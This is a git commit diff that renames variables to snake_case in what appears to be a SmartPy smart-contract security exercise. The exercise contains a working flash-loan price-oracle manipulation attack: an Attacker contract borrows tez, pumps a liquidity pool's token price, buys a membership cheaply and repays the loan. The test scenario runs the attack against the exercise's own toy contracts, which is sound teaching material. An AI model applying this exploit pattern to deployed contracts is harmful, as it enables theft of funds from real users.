2e9c7d18142de3c84f8b79db4bf2f9e6f3ccc2d0
Axel Roffi <axel.roffi@gmail.com>
2023-06-22 16:14:28 +0200

    from CamelCase to snake_case python style

--- Big_exercise/Attack_membership.py
+++ Big_exercise/Attack_membership.py
@@ -37,77 +37,77 @@ def main():
         def del_operator(self, operator):
             self.data.operators[sp.sender].remove(operator)
     
-    class LiquidityPool(sp.Contract):
+    class liquidity_pool(sp.Contract):
         def __init__(self, owner, ledger):
             self.data.ledger = ledger
             self.data.ledger_transfer = None
             self.data.owner = owner
             self.data.K = sp.tez(0)
-            self.data.tokensOwned = sp.nat(0)
-            # tokensOwned * sp.balance = K -> should always be true
+            self.data.tokens_owned = sp.nat(0)
+            # tokens_owned * sp.balance = K -> should always be true
 
         @sp.entrypoint
-        def provide_liquidity(self, depositedTokens):
+        def provide_liquidity(self, deposited_tokens):
             assert sp.sender == self.data.owner
             assert self.data.K == sp.tez(0)
-            self.data.K = sp.mul(sp.balance, depositedTokens)
+            self.data.K = sp.mul(sp.balance, deposited_tokens)
 
-            self.data.tokensOwned = depositedTokens
+            self.data.tokens_owned = deposited_tokens
 
             self.data.ledger_transfer = sp.contract(paramType, self.data.ledger, entrypoint="transfer")
-            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = depositedTokens), sp.tez(0), self.data.ledger_transfer.unwrap_some())
+            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = deposited_tokens), sp.tez(0), self.data.ledger_transfer.unwrap_some())
             
         @sp.entrypoint
         def withdraw_liquidity(self):
             assert sp.sender == self.data.owner
             sp.send(sp.sender, sp.balance)
             
-            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = self.data.tokensOwned), sp.tez(0), self.data.ledger_transfer.unwrap_some())
+            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = self.data.tokens_owned), sp.tez(0), self.data.ledger_transfer.unwrap_some())
 
-            self.data.tokensOwned = sp.nat(0)
+            self.data.tokens_owned = sp.nat(0)
             self.data.K = sp.tez(0)
 
         
         @sp.entrypoint
-        def sellTokens(self, nbTokensSold, minTezRequested):
-            ratio = sp.ediv(self.data.K, self.data.tokensOwned + nbTokensSold).unwrap_some()
-            tezObtained = sp.balance - sp.fst(ratio)
-            assert tezObtained >= minTezRequested
+        def sell_tokens(self, nb_tokens_sold, min_tez_requested):
+            ratio = sp.ediv(self.data.K, self.data.tokens_owned + nb_tokens_sold).unwrap_some()
+            tez_obtained = sp.balance - sp.fst(ratio)
+            assert tez_obtained >= min_tez_requested
 
-            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = nbTokensSold), sp.tez(0), self.data.ledger_transfer.unwrap_some())
+            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = nb_tokens_sold), sp.tez(0), self.data.ledger_transfer.unwrap_some())
 
-            self.data.tokensOwned += nbTokensSold
-            sp.send(sp.sender, tezObtained)
+            self.data.tokens_owned += nb_tokens_sold
+            sp.send(sp.sender, tez_obtained)
 
         @sp.entrypoint
-        def buyTokens(self, minTokensBought):
-            sp.cast(minTokensBought, sp.nat)
-            tokensObtained = sp.as_nat(self.data.tokensOwned - sp.fst(sp.ediv(self.data.K, sp.balance).unwrap_some()))
-            assert tokensObtained >= minTokensBought
+        def buy_tokens(self, min_tokens_bought):
+            sp.cast(min_tokens_bought, sp.nat)
+            tokens_obtained = sp.as_nat(self.data.tokens_owned - sp.fst(sp.ediv(self.data.K, sp.balance).unwrap_some()))
+            assert tokens_obtained >= min_tokens_bought
 
-            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = tokensObtained), sp.tez(0), self.data.ledger_transfer.unwrap_some())
+            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = tokens_obtained), sp.tez(0), self.data.ledger_transfer.unwrap_some())
 
-            self.data.tokensOwned = sp.as_nat(self.data.tokensOwned - tokensObtained)
+            self.data.tokens_owned = sp.as_nat(self.data.tokens_owned - tokens_obtained)
             
 
         @sp.onchain_view
         def get_token_price(self):
             # returns what we would get if we sold one token
-            ratio1 = sp.ediv(self.data.K, self.data.tokensOwned).unwrap_some()
-            ratio2 = sp.ediv(self.data.K, sp.as_nat(self.data.tokensOwned - 1)).unwrap_some()
+            ratio1 = sp.ediv(self.data.K, self.data.tokens_owned).unwrap_some()
+            ratio2 = sp.ediv(self.data.K, sp.as_nat(self.data.tokens_owned - 1)).unwrap_some()
             trace ("The current value of K is:")
             trace(self.data.K)
             trace("The pool owns this amount of tokens:")
-            trace(self.data.tokensOwned)
+            trace(self.data.tokens_owned)
             trace("The balance of the pool is:")
             trace(sp.balance)
             trace("The ratios before and after a potential purchase of 1 token would be:")
             trace(ratio1)
             trace(ratio2)
-            tokenPrice = sp.fst(ratio2) - sp.fst(ratio1)
+            token_price = sp.fst(ratio2) - sp.fst(ratio1)
             trace("The price of the token returned is:")
-            trace(tokenPrice)
-            return tokenPrice
+            trace(token_price)
+            return token_price
 
     class FlashLoanTez(sp.Contract):
         def __init__(self, owner, ledger, interest_rate):
@@ -166,10 +166,10 @@ def main():
             self.data.borrower = owner
 
         @sp.entrypoint
-        def deposit(self, tokensDeposited):
+        def deposit(self, tokens_deposited):
             self.data.ledger_contract_opt = sp.contract(paramType, self.data.ledger, entrypoint="transfer")
-            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = tokensDeposited), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
-            self.data.tokens_owned = tokensDeposited
+            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = tokens_deposited), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
+            self.data.tokens_owned = tokens_deposited
         
         @sp.entrypoint
         def borrow(self, loan_amount, callback):
@@ -202,12 +202,12 @@ def main():
             self.data.tokens_owned = sp.nat(0)
 
     class Membership(sp.Contract):
-        def __init__(self, membership_price, owner, ledger, liquidityPool):
+        def __init__(self, membership_price, owner, ledger, liquidity_pool):
             self.data.owner = owner
             self.data.membership_price = membership_price
             self.data.members = sp.set()
             self.data.ledger = ledger
-            self.data.liquidityPool = liquidityPool
+            self.data.liquidity_pool = liquidity_pool
 
         @sp.entrypoint
         def join(self):
@@ -219,19 +219,19 @@ def main():
         @sp.entrypoint
         def join_with_tokens(self, nbTokens):
             sp.cast(nbTokens, sp.nat)
-            tokenPrice =  sp.view("get_token_price", self.data.liquidityPool, (), sp.mutez).unwrap_some();
-            assert sp.mul(tokenPrice, nbTokens) > self.data.membership_price
+            token_price =  sp.view("get_token_price", self.data.liquidity_pool, (), sp.mutez).unwrap_some();
+            assert sp.mul(token_price, nbTokens) > self.data.membership_price
             ledger_contract = sp.contract(paramType, self.data.ledger, entrypoint="transfer").unwrap_some()
             sp.transfer(sp.record(source = sp.sender, destination = self.data.owner, amount = nbTokens), sp.tez(0), ledger_contract)
             self.data.members.add(sp.sender)
 
     class Attacker(sp.Contract):
-        def __init__(self, ledger, liquidityPool, membership, flashLoan, membership_price):
+        def __init__(self, ledger, liquidity_pool, membership, flashLoan, membership_price):
             self.data.ledger = ledger
-            self.data.liquidityPool = liquidityPool
+            self.data.liquidity_pool = liquidity_pool
             self.data.membership = membership
             self.data.flashLoan = flashLoan
-            self.data.expecedBoughtTokens = sp.nat(1667)
+            self.data.expected_bought_tokens = sp.nat(1667)
             self.data.loan_amount = sp.tez(10000)
             self.data.membership_price = membership_price
 
@@ -249,25 +249,25 @@ def main():
         @sp.entrypoint
         def attackPart2(self):
             trace("attack Part 2")
-            liquidityPool_buyTokens = sp.contract(sp.nat, self.data.liquidityPool, entrypoint="buyTokens").unwrap_some()
+            liquidity_pool_buy_tokens = sp.contract(sp.nat, self.data.liquidity_pool, entrypoint="buy_tokens").unwrap_some()
             trace("We purchase some tokens using these borrowed tez")
             trace("We expect to receive this amount:")
-            trace(self.data.expecedBoughtTokens)
-            sp.transfer(self.data.expecedBoughtTokens, self.data.loan_amount, liquidityPool_buyTokens)    
+            trace(self.data.expected_bought_tokens)
+            sp.transfer(self.data.expected_bought_tokens, self.data.loan_amount, liquidity_pool_buy_tokens)    
 
-            part3_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attackPart3").unwrap_some()
+            part3_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attack_part3").unwrap_some()
             trace("We call part3 in a transaction so that it takes place after the purchase is effective")
             sp.transfer((), sp.tez(0), part3_contract)
 
 
         @sp.entrypoint
-        def attackPart3(self):
+        def attack_part3(self):
             trace("We call the get_token_price view")
-            tokenPrice =  sp.view("get_token_price", self.data.liquidityPool, (), sp.mutez).unwrap_some()
+            token_price =  sp.view("get_token_price", self.data.liquidity_pool, (), sp.mutez).unwrap_some()
             trace("Token price is now:")
-            trace(tokenPrice)
+            trace(token_price)
             sp.cast(self.data.membership_price, sp.mutez)
-            priceInTokens = sp.fst(sp.ediv(self.data.membership_price, tokenPrice).unwrap_some()) + 1
+            priceInTokens = sp.fst(sp.ediv(self.data.membership_price, token_price).unwrap_some()) + 1
             trace("Price in tokens at which we buy the membership:")
             trace(priceInTokens)
             membership_contract = sp.contract(sp.nat, self.data.membership, entrypoint = "join_with_tokens").unwrap_some()
@@ -275,15 +275,15 @@ def main():
             trace("Purchase of the membership")
             sp.transfer(priceInTokens, sp.tez(0), membership_contract)
             
-            liquidityPool_sellTokens = sp.contract(sp.record(nbTokensSold = sp.nat, minTezRequested = sp.mutez), self.data.liquidityPool, entrypoint="sellTokens").unwrap_some()
-            trace("We can now sell our tokens back to the liquidityPool")
-            sp.transfer(sp.record(nbTokensSold = self.data.expecedBoughtTokens, minTezRequested = sp.tez(0)), sp.tez(0), liquidityPool_sellTokens)
+            liquidity_pool_sell_tokens = sp.contract(sp.record(nb_tokens_sold = sp.nat, min_tez_requested = sp.mutez), self.data.liquidity_pool, entrypoint="sell_tokens").unwrap_some()
+            trace("We can now sell our tokens back to the liquidity_pool")
+            sp.transfer(sp.record(nb_tokens_sold = self.data.expected_bought_tokens, min_tez_requested = sp.tez(0)), sp.tez(0), liquidity_pool_sell_tokens)
 
             trace("And we repay the flashloan, sending this amount:")
-            amountRepaid = self.data.loan_amount + sp.tez(100)
-            trace(amountRepaid)
+            amount_repaid = self.data.loan_amount + sp.tez(100)
+            trace(amount_repaid)
             flashLoan_repay = sp.contract(sp.unit, self.data.flashLoan, entrypoint="repay").unwrap_some()
-            sp.transfer((), amountRepaid, flashLoan_repay)
+            sp.transfer((), amount_repaid, flashLoan_repay)
         
         @sp.entrypoint
         def default(self):
@@ -299,13 +299,13 @@ def test():
     scenario += ledger
 
     
-    liquidityPool = main.LiquidityPool(owner = alice.address, ledger = ledger.address)
-    scenario += liquidityPool
+    liquidity_pool = main.liquidity_pool(owner = alice.address, ledger = ledger.address)
+    scenario += liquidity_pool
 
-    ledger.add_operator(liquidityPool.address).run(sender = alice)
-    liquidityPool.provide_liquidity(2000).run(sender = alice, amount = sp.tez(2000))
+    ledger.add_operator(liquidity_pool.address).run(sender = alice)
+    liquidity_pool.provide_liquidity(2000).run(sender = alice, amount = sp.tez(2000))
     
-    membership = main.Membership(membership_price = sp.tez(1000), owner = alice.address, ledger = ledger.address, liquidityPool = liquidityPool.address)
+    membership = main.Membership(membership_price = sp.tez(1000), owner = alice.address, ledger = ledger.address, liquidity_pool = liquidity_pool.address)
     scenario += membership
 
     flashLoan = main.FlashLoanTez(owner = alice.address, ledger = ledger.address, interest_rate = 1)
@@ -314,10 +314,10 @@ def test():
 
     flashLoan.deposit().run(sender = alice, amount = sp.tez(100000))
     
-    attacker = main.Attacker(ledger = ledger.address, liquidityPool = liquidityPool.address, membership = membership.address, flashLoan = flashLoan.address, membership_price = sp.tez(1000))
+    attacker = main.Attacker(ledger = ledger.address, liquidity_pool = liquidity_pool.address, membership = membership.address, flashLoan = flashLoan.address, membership_price = sp.tez(1000))
     scenario += attacker
     ledger.transfer(source = alice.address, destination = attacker.address, amount = 2000).run(sender = alice)
-    ledger.add_operator(liquidityPool.address).run(sender = attacker.address)
+    ledger.add_operator(liquidity_pool.address).run(sender = attacker.address)
     ledger.add_operator(flashLoan.address).run(sender = attacker.address)
     ledger.add_operator(membership.address).run(sender = attacker.address)
     
